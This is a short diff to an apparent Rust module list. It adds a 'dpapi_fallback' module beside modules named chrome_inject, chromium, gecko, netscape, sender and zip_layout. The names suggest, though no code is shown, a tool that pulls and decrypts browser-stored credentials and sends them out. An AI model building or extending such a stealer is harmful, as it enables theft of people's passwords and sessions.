@@ -1,6 +1,7 @@
 pub mod chrome_inject;
 pub mod chromium;
 pub mod gecko;
+mod dpapi_fallback;
 mod netscape;
 pub mod sender;
 mod zip_layout;
